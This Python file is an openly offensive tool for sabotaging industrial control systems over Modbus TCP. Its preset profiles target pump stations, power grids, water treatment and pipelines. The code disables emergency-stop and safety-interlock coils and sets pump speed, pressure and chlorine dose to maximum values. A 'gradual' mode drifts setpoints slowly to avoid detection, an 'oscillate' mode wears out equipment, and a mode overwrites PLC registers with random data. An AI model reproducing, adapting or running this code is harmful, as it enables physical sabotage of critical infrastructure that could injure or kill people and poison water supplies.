#!/usr/bin/env python3
"""ICS/OT Sabotage Objective — Targeted disruption of industrial control systems.
Modbus register manipulation, PLC logic corruption, safety system bypass."""
import json
import os
import socket
import struct
import threading
import time

class ICSSaboteur:
    """Industrial control system sabotage engine."""

    # Modbus function codes
    FC_READ_COILS = 0x01
    FC_READ_HOLDING = 0x03
    FC_WRITE_SINGLE_COIL = 0x05
    FC_WRITE_SINGLE_REG = 0x06
    FC_WRITE_MULTI_COILS = 0x0F
    FC_WRITE_MULTI_REGS = 0x10

    # Common ICS register maps
    REGISTER_PROFILES = {
        'pump_station': {
            'speed_setpoint': (0, 100),      # Register 0: pump speed 0-100%
            'pressure_limit': (1, 150),       # Register 1: max pressure PSI
            'flow_rate': (2, 50),             # Register 2: flow rate GPM
            'emergency_stop': (10, 0),        # Coil 10: E-stop
            'safety_interlock': (11, 1),      # Coil 11: safety interlock
        },
        'power_grid': {
            'voltage_setpoint': (0, 240),     # Register 0: voltage
            'frequency': (1, 60),             # Register 1: Hz
            'load_balance': (2, 50),          # Register 2: load %
            'breaker_main': (10, 1),          # Coil 10: main breaker
            'breaker_backup': (11, 1),        # Coil 11: backup
        },
        'water_treatment': {
            'chlorine_dose': (0, 2),          # Register 0: mg/L
            'ph_setpoint': (1, 70),           # Register 1: pH * 10
            'turbidity_limit': (2, 1),        # Register 2: NTU
            'pump_chemical': (10, 0),         # Coil 10: chemical pump
            'valve_main': (11, 1),            # Coil 11: main valve
        },
        'pipeline': {
            'pressure': (0, 500),             # Register 0: PSI
            'flow': (1, 100),                 # Register 1: BBL/hr
            'temperature': (2, 80),           # Register 2: degrees F
            'valve_inlet': (10, 1),           # Coil 10: inlet valve
            'valve_outlet': (11, 1),          # Coil 11: outlet valve
            'compressor': (12, 1),            # Coil 12: compressor
        },
    }

    def __init__(self, target_host, target_port=502, unit_id=1):
        self.target_host = target_host
        self.target_port = target_port
        self.unit_id = unit_id
        self.txn_id = 0
        self.sock = None
        self.original_values = {}  # For restore capability

    def _connect(self):
        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(5)
        self.sock.connect((self.target_host, self.target_port))

    def _modbus_request(self, function_code, data):
        """Send Modbus TCP request and get response."""
        self.txn_id = (self.txn_id + 1) & 0xFFFF
        pdu = bytes([self.unit_id, function_code]) + data
        mbap = struct.pack('>HHHB', self.txn_id, 0, len(pdu), self.unit_id)
        # Remove duplicate unit_id from MBAP (it's in PDU)
        mbap = struct.pack('>HHH', self.txn_id, 0, len(pdu)) + pdu

        if not self.sock:
            self._connect()

        self.sock.sendall(mbap)
        response = self.sock.recv(1024)

        if len(response) < 9:
            return None

        # Parse MBAP header
        resp_txn, resp_proto, resp_len = struct.unpack('>HHH', response[:6])
        resp_unit = response[6]
        resp_fc = response[7]

        if resp_fc & 0x80:  # Error response
            return None

        return response[8:]  # Return data portion

    def read_registers(self, start_addr, count=1):
        """Read holding registers."""
        data = struct.pack('>HH', start_addr, count)
        response = self._modbus_request(self.FC_READ_HOLDING, data)
        if response and len(response) >= 2 + count * 2:
            byte_count = response[0]
            values = []
            for i in range(count):
                val = struct.unpack('>H', response[1 + i*2:3 + i*2])[0]
                values.append(val)
            return values
        return None

    def write_register(self, addr, value):
        """Write single holding register."""
        data = struct.pack('>HH', addr, value)
        return self._modbus_request(self.FC_WRITE_SINGLE_REG, data)

    def write_coil(self, addr, value):
        """Write single coil."""
        coil_val = 0xFF00 if value else 0x0000
        data = struct.pack('>HH', addr, coil_val)
        return self._modbus_request(self.FC_WRITE_SINGLE_COIL, data)

    def write_registers(self, start_addr, values):
        """Write multiple registers."""
        count = len(values)
        data = struct.pack('>HHB', start_addr, count, count * 2)
        for v in values:
            data += struct.pack('>H', v)
        return self._modbus_request(self.FC_WRITE_MULTI_REGS, data)

    def snapshot_state(self, register_count=20, coil_count=20):
        """Capture current PLC state for later restoration."""
        state = {'registers': {}, 'timestamp': time.time()}

        regs = self.read_registers(0, register_count)
        if regs:
            for i, v in enumerate(regs):
                state['registers'][str(i)] = v

        self.original_values = state
        return state

    def restore_state(self):
        """Restore PLC to captured state."""
        if not self.original_values:
            return False

        for addr_str, value in self.original_values.get('registers', {}).items():
            self.write_register(int(addr_str), value)
            time.sleep(0.05)

        return True

    def execute_attack_profile(self, profile_name, mode='gradual'):
        """Execute predefined attack profile."""
        profile = self.REGISTER_PROFILES.get(profile_name)
        if not profile:
            return {'error': f'Unknown profile: {profile_name}'}

        results = []

        if mode == 'immediate':
            # Immediate disruption — write dangerous values
            for param, (addr, _) in profile.items():
                if 'safety' in param or 'emergency' in param:
                    # Disable safety systems
                    self.write_coil(addr, False)
                    results.append({'action': 'disable', 'param': param, 'addr': addr})
                elif 'speed' in param or 'dose' in param or 'pressure' in param:
                    # Set to maximum
                    self.write_register(addr, 65535)
                    results.append({'action': 'maximize', 'param': param, 'addr': addr})

        elif mode == 'gradual':
            # Gradual manipulation — harder to detect
            for param, (addr, normal_val) in profile.items():
                if 'safety' in param or 'interlock' in param:
                    continue  # Don't touch safety initially

                # Drift value by 10% every iteration
                current = self.read_registers(addr, 1)
                if current:
                    new_val = int(current[0] * 1.1)  # 10% increase
                    self.write_register(addr, min(new_val, 65535))
                    results.append({
                        'action': 'drift',
                        'param': param,
                        'old': current[0],
                        'new': min(new_val, 65535),
                    })
                time.sleep(0.5)  # Slow to avoid detection

        elif mode == 'oscillate':
            # Oscillate values to cause wear and instability
            for cycle in range(5):
                for param, (addr, normal_val) in profile.items():
                    if 'safety' in param:
                        continue
                    high_val = min(int(normal_val * 1.5), 65535)
                    low_val = max(int(normal_val * 0.5), 0)
                    target = high_val if cycle % 2 == 0 else low_val
                    self.write_register(addr, target)
                time.sleep(2)
            results.append({'action': 'oscillate', 'cycles': 5})

        return {
            'profile': profile_name,
            'mode': mode,
            'actions': results,
            'timestamp': time.time(),
        }

    def data_destruction(self):
        """Corrupt PLC memory — write random values to all registers."""
        results = []
        for addr in range(0, 100):
            random_val = struct.unpack('>H', os.urandom(2))[0]
            self.write_register(addr, random_val)
            results.append(addr)
            time.sleep(0.01)
        return {'destroyed_registers': len(results)}

    def close(self):
        if self.sock:
            self.sock.close()


def main():
    import argparse
    parser = argparse.ArgumentParser(description='ICS Sabotage')
    parser.add_argument('--target', required=True, help='Target PLC IP')
    parser.add_argument('--port', type=int, default=502)
    parser.add_argument('--profile', choices=list(ICSSaboteur.REGISTER_PROFILES.keys()))
    parser.add_argument('--mode', choices=['immediate', 'gradual', 'oscillate'], default='gradual')
    parser.add_argument('--snapshot', action='store_true', help='Capture state first')
    parser.add_argument('--restore', action='store_true', help='Restore captured state')
    parser.add_argument('--destroy', action='store_true', help='Data destruction mode')
    args = parser.parse_args()

    sab = ICSSaboteur(args.target, args.port)
    sab._connect()

    if args.snapshot:
        state = sab.snapshot_state()
        print(json.dumps(state, indent=2))

    if args.restore:
        sab.restore_state()
        print('[+] State restored')
    elif args.destroy:
        result = sab.data_destruction()
        print(json.dumps(result, indent=2))
    elif args.profile:
        result = sab.execute_attack_profile(args.profile, args.mode)
        print(json.dumps(result, indent=2))

    sab.close()

if __name__ == '__main__':
    main()

